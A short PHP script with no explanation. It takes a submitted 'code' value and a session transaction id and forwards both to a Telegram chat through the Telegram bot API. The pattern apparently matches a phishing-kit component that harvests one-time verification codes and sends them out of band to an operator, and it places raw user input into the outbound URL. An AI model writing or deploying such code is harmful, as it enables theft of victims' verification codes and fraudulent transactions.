<?php

include 'credentials.php';
if(!isset($_SESSION)) {
  session_start();
}


//if ($_POST['act'] == 'order') {
    $code = ($_POST['code']);

    $arr = array(
        'id: ' => $_SESSION['transaction_id'],
        'Code: ' => $code,
    );

    foreach($arr as $key => $value) {
        $txt .= "<b>".$key."</b> ".$value."%0A";
    };

    $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

//}

?>
